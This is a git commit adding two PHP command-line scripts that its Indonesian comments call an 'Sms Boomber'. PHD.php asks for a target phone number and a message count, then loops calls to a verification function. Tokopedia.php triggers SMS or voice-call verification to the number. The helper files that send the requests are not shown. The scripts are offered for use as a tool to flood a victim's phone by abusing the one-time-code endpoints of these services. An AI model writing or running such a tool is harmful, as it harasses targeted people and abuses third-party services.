746c17aa5615e30c60b562cc01b8e04dc711fce9
jakaabdulharis <jakaabdulharis@gmail.com>
2019-01-03 10:24:19 +0700

    Original

---
+++ PHD.php
@@ -0,0 +1,15 @@
+<?php
+include_once 'phdfunc.php';
+
+$init = new Bom();
+
+//Eksekusi Sms Boomber
+echo "Nomor Target (pakai 62): ";
+$a = trim(fgets(STDIN));
+$init->no = "$a";
+echo "Jumlah Pesan: ";
+$b = trim(fgets(STDIN));
+$loop = "$b";
+for ($i=0; $i < $loop; $i++) {
+    $init->Verif($init->no);
+}
---
+++ Tokopedia.php
@@ -0,0 +1,16 @@
+<?php
+include_once 'tokopediafunc.php';
+$init = new Bom();
+
+echo "Nomor Target (pakai 62): ";
+$a = trim(fgets(STDIN));
+$init->no = "$a";
+$init->type = 2; //Type 2 untuk telpon, Type 1 untuk sms
+
+if ($init->type == 1) {
+	for ($i=0; $i < 2; $i++) { 
+	    $init->Verif($init->no,$init->type);
+	}
+}elseif ($init->type == 2) {
+	 $init->Verif($init->no,$init->type);
+}
